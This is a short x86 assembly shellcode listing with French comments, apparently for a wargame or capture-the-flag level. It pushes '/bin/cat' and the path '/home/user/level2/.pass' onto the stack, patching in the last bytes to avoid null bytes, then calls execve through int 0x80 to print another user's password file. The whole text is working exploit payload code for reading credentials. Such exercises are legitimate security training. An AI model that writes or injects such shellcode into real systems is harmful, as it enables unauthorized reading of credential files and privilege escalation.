section .text
global _start

_start:
    xor eax, eax

    ; Pousser "/bin/cat\0"
    push eax
    push 0x7461632f
    push 0x6e69622f
    mov ebx, esp

    ; Pousser "/home/user/level2/.pas\0" et ajouter 's'
    push eax
    push 0x702e2f32    ; "2/.p"
    push 0x6c657665    ; "evel"
    push 0x6c2f7265    ; "er/l"
    push 0x73752f65    ; "e/us"
    push 0x6d6f682f    ; "/hom"
    mov esi, esp
    mov byte [esi+20], 0x61  ; Ajoute 'a'
    mov byte [esi+21], 0x73  ; Ajoute 's'
    mov byte [esi+22], 0x73  ; Ajoute 's'
    mov byte [esi+23], al    ; Ajoute \0

    ; Construire argv
    push eax
    push esi
    push ebx
    mov ecx, esp

    ; envp = NULL
    mov edx, eax

    ; execve
    mov al, 0x0b
    int 0x80